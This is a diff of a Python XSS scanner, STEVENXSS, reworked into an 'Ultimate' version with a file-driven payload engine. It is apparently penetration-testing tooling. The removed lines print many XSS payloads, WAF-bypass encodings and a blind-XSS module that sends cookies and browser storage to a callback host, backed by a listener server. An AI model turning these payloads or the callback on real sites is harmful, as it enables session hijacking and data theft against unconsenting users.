@@ -1,8 +1,8 @@
 #!/usr/bin/env python3
 """
-STEVENXSS v1.0 - DOM XSS Scanner
+STEVENXSS v1.0 - Ultimate DOM XSS Scanner
 Developer: STEVEN
-Advanced DOM-based XSS detection with Playwright and adaptive payload engine
+Enhanced with Advanced Payload Engine & Kali Linux Optimization
 """
 
 import asyncio
@@ -29,9 +29,7 @@ from playwright.async_api import async_playwright
 import html
 import base64
 
-# =============================================
-# ENHANCED TERMINAL UI AND DISPLAY
-# =============================================
+
 
 class TerminalColors:
     """ANSI color codes for terminal output"""
@@ -63,9 +61,9 @@ class DisplayManager:
 ║    ███████║   ██║   ███████╗ ╚████╔╝ ███████╗██║ ╚████║██╔╝ ██╗║
 ║    ╚══════╝   ╚═╝   ╚══════╝  ╚═══╝  ╚══════╝╚═╝  ╚═══╝╚═╝  ╚═╝║
 ║                                                                ║
-║    {TerminalColors.YELLOW}🚀 WELCOME TO STEVEN WEB KIT - free EDITION{TerminalColors.CYAN}      ║
-║    {TerminalColors.WHITE}Advanced DOM XSS Scanner v1.0{TerminalColors.CYAN}                          ║
-║    Developer: STEVEN | Enterprise Security Tool{TerminalColors.CYAN}           ║
+║    {TerminalColors.YELLOW}🚀 STEVENXSS v2.0 - ULTIMATE EDITION{TerminalColors.CYAN}              ║
+║    {TerminalColors.WHITE}Advanced DOM XSS Scanner with Smart Payload Engine{TerminalColors.CYAN}  ║
+║    Developer: STEVEN | Kali Linux Optimized{TerminalColors.CYAN}                 ║
 ║                                                                ║
 ╚════════════════════════════════════════════════════════════════╝
 {TerminalColors.END}
@@ -106,9 +104,10 @@ class DisplayManager:
     
     @staticmethod
     def print_progress(current, total, param, payload):
-        """Print progress indicator without showing full requests"""
-        percentage = (current / total) * 100
-        print(f"{TerminalColors.WHITE}[{current}/{total}] {percentage:.1f}% - Testing: {param} {TerminalColors.END}", end='\r')
+        """Print progress indicator"""
+        percentage = (current / total) * 100 if total > 0 else 0
+        payload_display = payload[:50] + "..." if len(payload) > 50 else payload
+        print(f"{TerminalColors.WHITE}[{current}/{total}] {percentage:.1f}% - Testing: {param} -> {payload_display}{TerminalColors.END}", end='\r')
     
     @staticmethod
     def print_vulnerability(result):
@@ -132,20 +131,17 @@ class DisplayManager:
         print(f"{TerminalColors.RED}│ {TerminalColors.CYAN}URL:        {TerminalColors.WHITE}{result.url}{TerminalColors.END}")
         print(f"{TerminalColors.RED}└──────────────────────────────────{TerminalColors.END}")
 
-# Configure advanced logging with enhanced format
+
 logging.basicConfig(
     level=logging.INFO,
-    format=f'{TerminalColors.WHITE}%(asctime)s - %(name)s - %(levelname)s - [%(filename)s:%(lineno)d] - %(message)s{TerminalColors.END}',
+    format=f'{TerminalColors.WHITE}%(asctime)s - %(name)s - %(levelname)s - %(message)s{TerminalColors.END}',
     handlers=[
         logging.FileHandler('stevenxss_advanced.log', encoding='utf-8'),
         logging.StreamHandler()
     ]
 )
-logger = logging.getLogger('STEVENXSSv1.0')
+logger = logging.getLogger('STEVENXSSv2.0')
 
-# =============================================
-# EXISTING CORE CLASSES (UNCHANGED)
-# =============================================
 
 class ScanContext(Enum):
     HTML = "html"
@@ -190,6 +186,8 @@ class PayloadEffectiveness:
     def _update_success_rate(self):
         if self.total_tests > 0:
             self.success_rate = (self.success_count / self.total_tests) * 100
+        else:
+            self.success_rate = 0.0
 
 class AsyncHTTPClient:
     def __init__(self, max_concurrency: int = 50, timeout: int = 30):
@@ -215,7 +213,7 @@ class AsyncHTTPClient:
                     text = await response.text()
                     return response.status, text, dict(response.headers)
             except Exception as e:
-                logger.error(f"GET request failed for {url}: {e}")
+                logger.error(f"GET request failed for {url}: {str(e)}")
                 return 0, str(e), {}
     
     async def post(self, url: str, data: Dict, headers: Dict = None) -> tuple[int, str, Dict]:
@@ -225,7 +223,7 @@ class AsyncHTTPClient:
                     text = await response.text()
                     return response.status, text, dict(response.headers)
             except Exception as e:
-                logger.error(f"POST request failed for {url}: {e}")
+                logger.error(f"POST request failed for {url}: {str(e)}")
                 return 0, str(e), {}
 
 class AdvancedDOMAnalyzer:
@@ -261,20 +259,27 @@ class AdvancedDOMAnalyzer:
         
         try:
             async with async_playwright() as p:
+           
                 browser = await p.chromium.launch(
                     headless=True,
-                    args=['--no-sandbox', '--disable-web-security']
+                    args=[
+                        '--no-sandbox',
+                        '--disable-web-security',
+                        '--disable-features=VizDisplayCompositor',
+                        '--disable-background-timer-throttling',
+                        '--disable-renderer-backgrounding'
+                    ]
                 )
                 context = await browser.new_context()
                 page = await context.new_page()
                 
                 try:
-                    # Enable console logging
+              
                     page.on("console", lambda msg: logger.debug(f"CONSOLE: {msg.text}"))
                     
                     await page.goto(url, wait_until="networkidle", timeout=30000)
                     
-                    # Comprehensive DOM analysis
+            
                     analysis_result = await page.evaluate("""
                         () => {
                             const results = {
@@ -361,42 +366,14 @@ class AdvancedDOMAnalyzer:
                                 });
                             });
 
-                            // Check for dynamic script creation
-                            if (document.createElement) {
-                                try {
-                                    const testScript = document.createElement('script');
-                                    results.dynamicScripts.push({
-                                        type: 'dynamic_script',
-                                        method: 'createElement',
-                                        available: true
-                                    });
-                                } catch (e) {}
-                            }
-
-                            // Check for URL manipulations
-                            if (window.history && window.history.pushState) {
-                                results.urlManipulations.push({
-                                    type: 'url_manipulation',
-                                    method: 'pushState',
-                                    available: true
-                                });
-                            }
-
-                            if (window.history && window.history.replaceState) {
-                                results.urlManipulations.push({
-                                    type: 'url_manipulation',
-                                    method: 'replaceState',
-                                    available: true
-                                });
-                            }
-
                             return results;
                         }
                     """)
                     
-                    dom_analysis.update(analysis_result)
+                    if analysis_result:
+                        dom_analysis.update(analysis_result)
                     
-                    # Test DOM XSS payloads
+           
                     DisplayManager.print_info("Testing DOM XSS payloads...")
                     dom_vulnerabilities = await self._test_dom_payloads(page, url)
                     dom_analysis['vulnerabilities'] = dom_vulnerabilities
@@ -404,11 +381,11 @@ class AdvancedDOMAnalyzer:
                     await browser.close()
                     
                 except Exception as e:
-                    logger.error(f"DOM analysis failed for {url}: {e}")
+                    logger.error(f"DOM analysis failed for {url}: {str(e)}")
                     await browser.close()
         
         except Exception as e:
-            logger.error(f"Playwright initialization failed: {e}")
+            logger.error(f"Playwright initialization failed: {str(e)}")
         
         DisplayManager.print_success(f"DOM analysis completed - Found {len(dom_analysis['vulnerabilities'])} potential issues")
         return dom_analysis
@@ -420,10 +397,10 @@ class AdvancedDOMAnalyzer:
         
         for payload in dom_payloads:
             try:
-                # Test in hash context
+          
                 await page.goto(f"{url}#{payload}", wait_until="networkidle")
                 
-                # Test in various DOM contexts
+            
                 test_results = await page.evaluate("""
                     (payload) => {
                         const results = {
@@ -459,14 +436,6 @@ class AdvancedDOMAnalyzer:
                                 results.event_handler = true;
                             }
 
-                            // Test URL manipulation
-                            if (history.pushState) {
-                                const originalURL = location.href;
-                                history.pushState({}, '', payload);
-                                results.url_manipulation = location.href.includes(payload);
-                                history.pushState({}, '', originalURL);
-                            }
-
                         } catch (e) {
                             console.error('DOM test error:', e);
                         }
@@ -475,7 +444,7 @@ class AdvancedDOMAnalyzer:
                     }
                 """, payload)
                 
-                # Check for successful executions
+         
                 if any(test_results.values()):
                     vulnerability = {
                         'payload': payload,
@@ -488,7 +457,7 @@ class AdvancedDOMAnalyzer:
                     DisplayManager.print_warning(f"DOM XSS potential detected: {payload}")
                 
             except Exception as e:
-                logger.debug(f"DOM payload test failed for {payload}: {e}")
+                logger.debug(f"DOM payload test failed for {payload}: {str(e)}")
         
         return vulnerabilities
     
@@ -502,10 +471,7 @@ class AdvancedDOMAnalyzer:
             "#<script>alert(1)</script>",
             "#{alert(1)}",
             "#${alert(1)}",
-            "#`${alert(1)}`",
-            "#{{constructor.constructor('alert(1)')()}}",
-            "#<svg onload=alert(1)>",
-            "#<iframe src=javascript:alert(1)>"
+            "#`${alert(1)}`"
         ]
     
     def _calculate_confidence(self, test_results: Dict) -> float:
@@ -525,128 +491,122 @@ class AdvancedDOMAnalyzer:
         
         return min(confidence * 100, 100.0)
 
-class AdvancedAdaptivePayloadEngine:
+class UltimatePayloadEngine:
     def __init__(self):
         self.payload_effectiveness: Dict[str, PayloadEffectiveness] = {}
         self.context_success_rates: Dict[ScanContext, float] = {}
         self.learning_enabled = True
+        self.smart_categories = {}
+    
+    def analyze_payload_file(self, file_path: str) -> Dict[str, List[str]]:
+        """Analyze and categorize payloads from file"""
+        DisplayManager.print_info(f"Analyzing payload file: {file_path}")
+        
+        categories = {
+            'basic_script': [],
+            'img_tags': [],
+            'svg_payloads': [],
+            'event_handlers': [],
+            'javascript_urls': [],
+            'data_urls': [],
+            'encoding_bypass': [],
+            'polyglot': [],
+            'waf_bypass': [],
+            'dom_based': [],
+            'blind_xss': []
+        }
+        
+        try:
+            with open(file_path, 'r', encoding='utf-8') as f:
+                current_category = 'basic_script'
+                
+                for line in f:
+                    line = line.strip()
+                    
+                    if not line or line.startswith('#'):
+                 
+                        if 'BASIC SCRIPT' in line:
+                            current_category = 'basic_script'
+                        elif 'IMG TAG' in line:
+                            current_category = 'img_tags'
+                        elif 'SVG' in line:
+                            current_category = 'svg_payloads'
+                        elif 'EVENT HANDLER' in line:
+                            current_category = 'event_handlers'
+                        elif 'JAVASCRIPT URL' in line:
+                            current_category = 'javascript_urls'
+                        elif 'DATA URL' in line:
+                            current_category = 'data_urls'
+                        elif 'ENCODING' in line:
+                            current_category = 'encoding_bypass'
+                        elif 'POLYGLOT' in line:
+                            current_category = 'polyglot'
+                        elif 'WAF' in line or 'BYPASS' in line:
+                            current_category = 'waf_bypass'
+                        elif 'DOM' in line:
+                            current_category = 'dom_based'
+                        elif 'BLIND' in line:
+                            current_category = 'blind_xss'
+                        continue
+                    
+                
+                    if line and not line.startswith('#'):
+                        if current_category in categories:
+                            categories[current_category].append(line)
+                        else:
+                            categories['basic_script'].append(line)
+            
+     
+            for category, payloads in categories.items():
+                for payload in payloads:
+                    if payload not in self.payload_effectiveness:
+                        self.payload_effectiveness[payload] = PayloadEffectiveness(payload=payload)
+            
+            self.smart_categories = categories
+            DisplayManager.print_success(f"Payload analysis complete: {sum(len(p) for p in categories.values())} payloads in {len(categories)} categories")
+            
+        except Exception as e:
+            DisplayManager.print_error(f"Error analyzing payload file: {str(e)}")
+            # Fallback to basic payloads
+            categories['basic_script'] = ["<script>alert('XSS')</script>"]
+        
+        return categories
+    
+    def get_smart_payloads(self, strategy: str = "comprehensive") -> List[str]:
+        """Get payloads based on smart strategy"""
+        strategies = {
+            "quick": ['basic_script', 'img_tags', 'event_handlers'],
+            "comprehensive": ['basic_script', 'img_tags', 'svg_payloads', 'event_handlers', 'javascript_urls'],
+            "waf_bypass": ['encoding_bypass', 'polyglot', 'waf_bypass'],
+            "dom_focused": ['dom_based', 'event_handlers', 'javascript_urls'],
+            "blind_xss": ['blind_xss', 'img_tags', 'svg_payloads']
+        }
+        
+        selected_categories = strategies.get(strategy, strategies["comprehensive"])
+        payloads = []
+        
+        for category in selected_categories:
+            payloads.extend(self.smart_categories.get(category, []))
+        
+        return list(set(payloads))
     
     def generate_context_specific_payloads(self, context: ScanContext) -> List[str]:
         """Generate payloads specific to injection context"""
-        base_payloads = {
-            ScanContext.HTML: [
-                "<script>alert(1)</script>",
-                "><script>alert(1)</script>",
-                "</script><script>alert(1)</script>",
-                "<img src=x onerror=alert(1)>",
-                "<svg onload=alert(1)>",
-                "<body onload=alert(1)>",
-                "<iframe src=javascript:alert(1)>"
-            ],
-            ScanContext.ATTRIBUTE: [
-                "\" onmouseover=\"alert(1)",
-                "' onfocus='alert(1)",
-                " autofocus onfocus=alert(1)//",
-                "x\" autofocus onfocus=alert(1) \"",
-                "` onfocus=alert(1) x=\"",
-                " onfocus=alert(1) autofocus"
-            ],
-            ScanContext.JAVASCRIPT: [
-                "';alert(1);//",
-                "\";alert(1);//",
-                "`;alert(1);//",
-                "};alert(1);//",
-                "\\';alert(1);//",
-                "</script><script>alert(1)</script>"
-            ],
-            ScanContext.URL: [
-                "javascript:alert(1)",
-                "javascript:alert(document.domain)",
-                "JavasCript:alert(1)",
-                "data:text/html,<script>alert(1)</script>",
-                "vbscript:msgbox(1)"
-            ],
-            ScanContext.DOM: [
-                "#<img src=x onerror=alert(1)>",
-                "#javascript:alert(1)",
-                "#'onclick=alert(1)//",
-                "#{alert(1)}",
-                "#${alert(1)}"
-            ]
+        context_mapping = {
+            ScanContext.HTML: ['basic_script', 'img_tags', 'svg_payloads'],
+            ScanContext.ATTRIBUTE: ['event_handlers', 'encoding_bypass'],
+            ScanContext.JAVASCRIPT: ['javascript_urls', 'encoding_bypass'],
+            ScanContext.URL: ['javascript_urls', 'data_urls'],
+            ScanContext.DOM: ['dom_based', 'event_handlers']
         }
         
-        return base_payloads.get(context, [])
-    
-    def generate_polyglot_payloads(self) -> List[str]:
-        """Generate polyglot payloads that work in multiple contexts"""
-        return [
-            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert(1)//",
-            ">><marquee><img src=x onerror=confirm(1)></marquee>",
-            "javascript://%0Aalert(1)",
-            "`\"'><script>\\u0061lert(1)</script>",
-            "<!--<img src=\"--><img src=x onerror=alert(1)>",
-            "<<script>alert(1)</script>",
-            "<img/src=\"`<script>alert(1)</script>\"`",
-            "\\\"\\'--></style></scRipt><scRipt>alert(1)</scRipt>"
-        ]
-    
-    def generate_encoded_payloads(self, payload: str) -> List[str]:
-        """Generate encoded variations of a payload"""
-        variations = []
+        categories = context_mapping.get(context, ['basic_script'])
+        payloads = []
         
-        # URL encoding
-        variations.append(urllib.parse.quote(payload))
-        variations.append(urllib.parse.quote_plus(payload))
+        for category in categories:
+            payloads.extend(self.smart_categories.get(category, []))
         
-        # HTML encoding
-        variations.append(html.escape(payload))
-        variations.append(payload.replace('<', '&lt;').replace('>', '&gt;'))
-        
-        # Unicode encoding
-        variations.append(''.join([f'\\u{ord(c):04x}' for c in payload]))
-        variations.append(''.join([f'%u{ord(c):04x}' for c in payload]))
-        
-        # Double encoding
-        variations.append(urllib.parse.quote(urllib.parse.quote(payload)))
-        variations.append(html.escape(html.escape(payload)))
-        
-        # Base64 encoding
-        try:
-            variations.append(f"data:text/html;base64,{base64.b64encode(payload.encode()).decode()}")
-        except:
-            pass
-        
-        # Mixed encoding
-        mixed = payload
-        mixed = mixed.replace('<', '%3C').replace('>', '%3E')
-        mixed = mixed.replace('"', '%22').replace("'", '%27')
-        variations.append(mixed)
-        
-        return variations
-    
-    def generate_adaptive_payloads(self, successful_contexts: Set[ScanContext] = None) -> List[str]:
-        """Generate adaptive payloads based on successful patterns"""
-        all_payloads = set()
-        
-        # Add context-specific payloads
-        if successful_contexts:
-            for context in successful_contexts:
-                all_payloads.update(self.generate_context_specific_payloads(context))
-        else:
-            # Add payloads for all contexts
-            for context in ScanContext:
-                if context != ScanContext.UNKNOWN:
-                    all_payloads.update(self.generate_context_specific_payloads(context))
-        
-        # Add polyglot payloads
-        all_payloads.update(self.generate_polyglot_payloads())
-        
-        # Add encoded variations for top payloads
-        top_payloads = self.get_most_effective_payloads(limit=10)
-        for payload in top_payloads:
-            all_payloads.update(self.generate_encoded_payloads(payload))
-        
-        return list(all_payloads)
+        return payloads
     
     def update_effectiveness(self, payload: str, context: ScanContext, successful: bool):
         """Update payload effectiveness tracking"""
@@ -661,11 +621,15 @@ class AdvancedAdaptivePayloadEngine:
             effectiveness.contexts.add(context)
         
         effectiveness._update_success_rate()
-    
+        
+      
+        if context not in self.context_success_rates:
+            self.context_success_rates[context] = 0.0
+        
     def get_most_effective_payloads(self, limit: int = 20) -> List[str]:
         """Get most effective payloads based on success rate"""
         effective_payloads = sorted(
-            self.payload_effectiveness.values(),
+            [p for p in self.payload_effectiveness.values() if p.total_tests > 0],
             key=lambda x: x.success_rate,
             reverse=True
         )
@@ -709,23 +673,28 @@ class AdvancedReflectionAnalyzer:
             'confidence_score': 0.0
         }
         
-        # Exact reflection check
-        analysis['exact_reflection'] = payload in response_text
-        analysis['reflection_points'] = response_text.count(payload)
-        
-        # Partial reflection checks
-        analysis['partial_reflection'] = self._check_partial_reflection(response_text, payload)
-        
-        # Context detection
-        analysis['contexts'] = self._detect_injection_context(response_text, payload)
-        analysis['context_details'] = self._get_context_details(response_text, payload)
-        
-        # Security measures detection
-        analysis['encoding_detected'] = self._check_encoding(response_text, payload)
-        analysis['filter_attempts'] = self._check_filter_attempts(response_text, payload)
-        
-        # Confidence scoring
-        analysis['confidence_score'] = self._calculate_confidence(analysis)
+        try:
+            # Exact reflection check
+            analysis['exact_reflection'] = payload in response_text
+            analysis['reflection_points'] = response_text.count(payload)
+            
+            # Partial reflection checks
+            analysis['partial_reflection'] = self._check_partial_reflection(response_text, payload)
+            
+            # Context detection
+            analysis['contexts'] = self._detect_injection_context(response_text, payload)
+            analysis['context_details'] = self._get_context_details(response_text, payload)
+            
+            # Security measures detection
+            analysis['encoding_detected'] = self._check_encoding(response_text, payload)
+            analysis['filter_attempts'] = self._check_filter_attempts(response_text, payload)
+            
+            # Confidence scoring
+            analysis['confidence_score'] = self._calculate_confidence(analysis)
+            
+        except Exception as e:
+            logger.error(f"Reflection analysis error: {str(e)}")
+            analysis['confidence_score'] = 0.0
         
         return analysis
     
@@ -749,56 +718,61 @@ class AdvancedReflectionAnalyzer:
         """Detect injection context with pattern matching"""
         contexts = set()
         
-        for context, patterns in self.context_patterns.items():
-            for pattern in patterns:
-                escaped_payload = re.escape(payload)
-                formatted_pattern = pattern.format(escaped_payload)
-                if re.search(formatted_pattern, response_text, re.IGNORECASE | re.DOTALL):
-                    contexts.add(context)
+        try:
+            for context, patterns in self.context_patterns.items():
+                for pattern in patterns:
+                    escaped_payload = re.escape(payload)
+                    formatted_pattern = pattern.format(escaped_payload)
+                    if re.search(formatted_pattern, response_text, re.IGNORECASE | re.DOTALL):
+                        contexts.add(context)
+        except Exception as e:
+            logger.debug(f"Context detection error: {str(e)}")
         
         return list(contexts) if contexts else [ScanContext.UNKNOWN]
     
     def _get_context_details(self, response_text: str, payload: str) -> Dict:
         """Get detailed context information"""
-        details = {}
+        details = {'positions': [], 'surrounding_text': []}
         
-        # Find reflection positions
-        positions = []
-        start = 0
-        while True:
-            pos = response_text.find(payload, start)
-            if pos == -1:
-                break
-            positions.append(pos)
-            start = pos + 1
-        
-        details['positions'] = positions
-        details['surrounding_text'] = []
-        
-        # Get surrounding context for each position
-        for pos in positions[:3]:  # Limit to first 3 positions
-            start = max(0, pos - 50)
-            end = min(len(response_text), pos + len(payload) + 50)
-            context = response_text[start:end]
-            details['surrounding_text'].append({
-                'position': pos,
-                'context': context,
-                'before': response_text[start:pos],
-                'after': response_text[pos + len(payload):end]
-            })
+        try:
+            # Find reflection positions
+            start = 0
+            while True:
+                pos = response_text.find(payload, start)
+                if pos == -1:
+                    break
+                details['positions'].append(pos)
+                start = pos + 1
+            
+            # Get surrounding context for each position (limit to first 3)
+            for pos in details['positions'][:3]:
+                start_pos = max(0, pos - 50)
+                end_pos = min(len(response_text), pos + len(payload) + 50)
+                context = response_text[start_pos:end_pos]
+                details['surrounding_text'].append({
+                    'position': pos,
+                    'context': context,
+                    'before': response_text[start_pos:pos],
+                    'after': response_text[pos + len(payload):end_pos]
+                })
+        except Exception as e:
+            logger.debug(f"Context details error: {str(e)}")
         
         return details
     
     def _check_encoding(self, response_text: str, payload: str) -> bool:
         """Check if payload is encoded in response"""
-        encoded_variations = [
-            html.escape(payload),
-            urllib.parse.quote(payload),
-            payload.replace('<', '&lt;').replace('>', '&gt;'),
-            payload.replace('"', '&quot;').replace("'", '&#x27;')
-        ]
-        
-        return any(encoded in response_text for encoded in encoded_variations)
+        try:
+            encoded_variations = [
+                html.escape(payload),
+                urllib.parse.quote(payload),
+                payload.replace('<', '&lt;').replace('>', '&gt;'),
+                payload.replace('"', '&quot;').replace("'", '&#x27;')
+            ]
+            
+            return any(encoded in response_text for encoded in encoded_variations)
+        except:
+            return False
     
     def _check_filter_attempts(self, response_text: str, payload: str) -> bool:
         """Check if filtering was attempted"""
@@ -813,130 +787,33 @@ class AdvancedReflectionAnalyzer:
         """Calculate confidence score for vulnerability"""
         confidence = 0.0
         
-        if analysis['exact_reflection']:
-            confidence += 40
-        
-        if analysis['partial_reflection']:
-            confidence += 20
-        
-        if analysis['reflection_points'] > 1:
-            confidence += 10
-        
-        if not analysis['encoding_detected']:
-            confidence += 20
-        
-        if analysis['contexts'] and ScanContext.UNKNOWN not in analysis['contexts']:
-            confidence += 10
+        try:
+            if analysis['exact_reflection']:
+                confidence += 40
+            
+            if analysis['partial_reflection']:
+                confidence += 20
+            
+            if analysis['reflection_points'] > 1:
+                confidence += 10
+            
+            if not analysis['encoding_detected']:
+                confidence += 20
+            
+            if analysis['contexts'] and ScanContext.UNKNOWN not in analysis['contexts']:
+                confidence += 10
+        except:
+            confidence = 0.0
         
         return min(confidence, 100.0)
-
-class BlindXSSIntegration:
-    def __init__(self, callback_domain: str = None, port: int = 8888):
-        self.callback_domain = callback_domain
-        self.port = port
-        self.callbacks_received = []
-        self.server = None
-    
-    def generate_blind_payloads(self) -> List[str]:
-        """Generate blind XSS payloads"""
-        if not self.callback_domain:
-            return []
-        
-        payloads = []
-        protocols = ['http', 'https'] if not self.callback_domain.startswith('http') else ['']
-        
-        for protocol in protocols:
-            base_url = f"{protocol}://{self.callback_domain}" if protocol else self.callback_domain
-            
-            payloads.extend([
-                f"""<script>fetch('{base_url}/c?'+btoa(document.cookie))</script>""",
-                f"""<img src=x onerror="this.src='{base_url}/i?'+btoa(document.cookie)">""",
-                f"""<script>var x=new XMLHttpRequest();x.open('GET','{base_url}/x?'+btoa(location.href),true);x.send();</script>""",
-                f"""<script>navigator.sendBeacon('{base_url}/b',document.domain)</script>""",
-                f"""<iframe src="{base_url}/f" onload="this.src='{base_url}/f?'+btoa(window.name)"></iframe>""",
-                f"""<link rel="stylesheet" href="{base_url}/s?'+document.domain">""",
-                f"""<meta http-equiv="refresh" content="0;url={base_url}/m?'+btoa(localStorage)">""",
-                f"""<object data="{base_url}/o?'+btoa(sessionStorage)">""",
-                f"""<embed src="{base_url}/e?'+btoa(JSON.stringify(performance.timing))">"""
-            ])
-        
-        return payloads
-    
-    async def start_callback_server(self):
-        """Start blind XSS callback server"""
-        from aiohttp import web
-        
-        async def handle_callback(request):
-            callback_data = {
-                'timestamp': time.time(),
-                'source_ip': request.remote,
-                'method': request.method,
-                'path': request.path,
-                'headers': dict(request.headers),
-                'query_params': dict(request.query),
-                'cookies': dict(request.cookies)
-            }
-            
-            # Try to get POST data
-            try:
-                if request.method == 'POST':
-                    callback_data['post_data'] = await request.text()
-            except:
-                pass
-            
-            self.callbacks_received.append(callback_data)
-            
-            DisplayManager.print_success(f"Blind XSS Callback from {request.remote} - Path: {request.path}")
-            
-            # Return tracking pixel or empty response
-            if request.path.startswith('/i'):
-                # Return 1x1 transparent GIF
-                gif_pixel = base64.b64decode('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7')
-                return web.Response(body=gif_pixel, content_type='image/gif')
-            else:
-                return web.Response(text='OK')
-        
-        app = web.Application()
-        
-        # Add routes for different callback types
-        app.router.add_get('/{path:.*}', handle_callback)
-        app.router.add_post('/{path:.*}', handle_callback)
-        
-        runner = web.AppRunner(app)
-        await runner.setup()
-        
-        self.server = web.TCPSite(runner, '0.0.0.0', self.port)
-        await self.server.start()
-        
-        DisplayManager.print_success(f"Blind XSS callback server started on port {self.port}")
-        DisplayManager.print_info(f"Callback URL: http://YOUR_DOMAIN:{self.port}/")
-    
-    async def stop_callback_server(self):
-        """Stop the callback server"""
-        if self.server:
-            await self.server.stop()
-            DisplayManager.print_info("Blind XSS callback server stopped")
-    
-    def get_callback_statistics(self) -> Dict:
-        """Get callback statistics"""
-        return {
-            'total_callbacks': len(self.callbacks_received),
-            'unique_ips': len(set(cb['source_ip'] for cb in self.callbacks_received)),
-            'callback_types': {
-                'get': len([cb for cb in self.callbacks_received if cb['method'] == 'GET']),
-                'post': len([cb for cb in self.callbacks_received if cb['method'] == 'POST'])
-            },
-            'recent_callbacks': self.callbacks_received[-10:]  # Last 10 callbacks
-        }
 
 class STEVENXSSScanner:
     def __init__(self, max_concurrency: int = 50):
         self.max_concurrency = max_concurrency
         self.http_client = None
-        self.payload_engine = AdvancedAdaptivePayloadEngine()
+        self.payload_engine = UltimatePayloadEngine()
         self.reflection_analyzer = AdvancedReflectionAnalyzer()
         self.dom_analyzer = AdvancedDOMAnalyzer()
-        self.blind_xss = None
         
         self.results: List[ScanResult] = []
         self.stats = {
@@ -946,50 +823,55 @@ class STEVENXSSScanner:
             'scan_end_time': None,
             'dom_vulnerabilities': 0,
             'current_test': 0,
-            'total_tests': 0
+            'total_tests': 0,
+            'successful_tests': 0
         }
         self.successful_contexts: Set[ScanContext] = set()
         
     async def initialize(self):
-        self.http_client = AsyncHTTPClient(max_concurrency=self.max_concurrency)
-        await self.http_client.__aenter__()
-        self.stats['scan_start_time'] = time.time()
+        """Initialize the scanner"""
+        try:
+            self.http_client = AsyncHTTPClient(max_concurrency=self.max_concurrency)
+            await self.http_client.__aenter__()
+            self.stats['scan_start_time'] = time.time()
+            return True
+        except Exception as e:
+            DisplayManager.print_error(f"Failed to initialize scanner: {str(e)}")
+            return False
     
     async def close(self):
-        if self.http_client:
-            await self.http_client.__aexit__(None, None, None)
-        self.stats['scan_end_time'] = time.time()
+        """Close the scanner"""
+        try:
+            if self.http_client:
+                await self.http_client.__aexit__(None, None, None)
+            self.stats['scan_end_time'] = time.time()
+        except Exception as e:
+            logger.error(f"Error closing scanner: {str(e)}")
     
     def get_scan_duration(self) -> float:
         """Calculate scan duration safely"""
         if self.stats['scan_start_time'] is None:
             return 0.0
         if self.stats['scan_end_time'] is None:
-            # If scan hasn't ended yet, calculate from current time
             return time.time() - self.stats['scan_start_time']
         return self.stats['scan_end_time'] - self.stats['scan_start_time']
-    
-    def _load_payloads(self, file_path: str) -> List[str]:
-        """Load payloads from file"""
-        try:
-            with open(file_path, 'r', encoding='utf-8') as f:
-                return [line.strip() for line in f if line.strip() and not line.startswith('#')]
-        except Exception as e:
-            DisplayManager.print_error(f"Error loading payloads from {file_path}: {e}")
-            return []
     
     def _extract_parameters(self, url: str, post_data: Dict = None) -> List[str]:
         """Extract parameters from URL and POST data"""
         parameters = []
         
-        parsed = urllib.parse.urlparse(url)
-        query_params = urllib.parse.parse_qs(parsed.query)
-        parameters.extend(query_params.keys())
-        
-        if post_data:
-            parameters.extend(post_data.keys())
-        
-        return list(set(parameters))
+        try:
+            parsed = urllib.parse.urlparse(url)
+            query_params = urllib.parse.parse_qs(parsed.query)
+            parameters.extend(query_params.keys())
+            
+            if post_data:
+                parameters.extend(post_data.keys())
+            
+            return list(set(parameters))
+        except Exception as e:
+            logger.error(f"Error extracting parameters: {str(e)}")
+            return []
     
     async def _test_parameter_payload(self, url: str, param: str, payload: str, 
                                     method: str = 'GET', post_data: Dict = None, 
@@ -999,13 +881,13 @@ class STEVENXSSScanner:
             self.stats['total_requests'] += 1
             self.stats['current_test'] += 1
             
-            # Show progress without detailed request info
-            if self.stats['current_test'] % 10 == 0:  # Update every 10 tests
+       
+            if self.stats['current_test'] % 10 == 0:
                 DisplayManager.print_progress(
                     self.stats['current_test'], 
                     self.stats['total_tests'],
                     param,
-                    payload[:50] + "..." if len(payload) > 50 else payload
+                    payload
                 )
             
             if method.upper() == 'GET':
@@ -1013,19 +895,22 @@ class STEVENXSSScanner:
             else:
                 status, response_text, response_headers = await self._test_post_payload(url, param, payload, post_data, headers)
             
-            # Analyze reflection
+      
             reflection_analysis = self.reflection_analyzer.analyze_reflection(response_text, payload)
             
-            # Determine vulnerability level
+          
             vulnerability_level = self._assess_vulnerability_level(reflection_analysis)
             
-            # Update payload effectiveness
+           
             is_successful = vulnerability_level != VulnerabilityLevel.LOW
             context = reflection_analysis['contexts'][0] if reflection_analysis['contexts'] else ScanContext.UNKNOWN
-            self.payload_engine.update_effectiveness(payload, context, is_successful)
             
             if is_successful:
+                self.payload_engine.update_effectiveness(payload, context, True)
                 self.successful_contexts.add(context)
+                self.stats['successful_tests'] += 1
+            else:
+                self.payload_engine.update_effectiveness(payload, context, False)
             
             result = ScanResult(
                 url=url,
@@ -1041,74 +926,85 @@ class STEVENXSSScanner:
             
             if is_successful:
                 DisplayManager.print_vulnerability(result)
-            
-            return result if is_successful else None
-            
+                return result
+            else:
+                return None
+                
         except Exception as e:
-            # Don't show individual error messages for each request
-            logger.debug(f"Error testing {param} with {payload}: {e}")
+            logger.debug(f"Error testing {param} with {payload}: {str(e)}")
             return None
     
     async def _test_get_payload(self, url: str, param: str, payload: str, headers: Dict = None) -> tuple[int, str, Dict]:
         """Test payload in GET request"""
-        parsed = urllib.parse.urlparse(url)
-        query_params = urllib.parse.parse_qs(parsed.query)
-        
-        if param in query_params:
-            query_params[param] = [payload]
-            new_query = urllib.parse.urlencode(query_params, doseq=True)
-            target_url = urllib.parse.urlunparse((
-                parsed.scheme, parsed.netloc, parsed.path,
-                parsed.params, new_query, parsed.fragment
-            ))
+        try:
+            parsed = urllib.parse.urlparse(url)
+            query_params = urllib.parse.parse_qs(parsed.query)
             
-            return await self.http_client.get(target_url, headers)
-        
-        return 0, "", {}
+            if param in query_params:
+                query_params[param] = [payload]
+                new_query = urllib.parse.urlencode(query_params, doseq=True)
+                target_url = urllib.parse.urlunparse((
+                    parsed.scheme, parsed.netloc, parsed.path,
+                    parsed.params, new_query, parsed.fragment
+                ))
+                
+                return await self.http_client.get(target_url, headers)
+            
+            return 0, "", {}
+        except Exception as e:
+            logger.error(f"GET payload test error: {str(e)}")
+            return 0, str(e), {}
     
